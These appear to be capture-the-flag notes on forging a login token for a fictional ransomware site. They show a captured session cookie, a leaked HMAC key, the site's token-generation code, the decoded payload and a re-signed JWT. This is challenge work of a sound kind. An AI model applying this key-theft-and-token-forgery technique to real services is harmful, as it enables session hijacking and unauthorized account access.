cookie from task 5:
```
# Netscape HTTP Cookie File
gztkmtljeceezgmv.ransommethis.net       FALSE   /       TRUE    2145916800      tok     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTI0MjkzNTcsImV4cCI6MTY1NTAyMTM1Nywic2VjIjoiUDVRUXVscUI1V2VCdVNvWE54UGxCc3F0RGVzSWRqcUMiLCJ1aWQiOjI1NzYxfQ.sIUXAb5IhwBeC1kzODXLLv46r706lA5T_kEC54f8OA8 
```

source code from task b2

hmac key for jwt is ymQB3PsFosPGikNLLTiWwnYOpVdqXEBw

```py
def generate_token(userName):
	""" Generate a new login token for the given user, good for 30 days"""
	with userdb() as con:
		row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
		now = datetime.now()
		exp = now + timedelta(days=30)
		claims = {'iat': now,
		          'exp': exp,
				  'uid': row[0],
				  'sec': row[1]}
		return jwt.encode(claims, hmac_key(), algorithm='HS256')
```

payload from task 5 jwt

```json
{
  "iat": 1652429357,
  "exp": 1655021357,
  "sec": "P5QQulqB5WeBuSoXNxPlBsqtDesIdjqC",
  "uid": 25761
}
```

generate a jwt with `gen_jwt.py`

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjEwODMzOTIsImV4cCI6MTY2MzY3NTM5MiwidWlkIjoyNTc2MSwic2VjIjoiUDVRUXVscUI1V2VCdVNvWE54UGxCc3F0RGVzSWRqcUMifQ.iC7i3P4YtLGPto70FxD4w9fvLI0R_hNDl3e2os6j0EM
```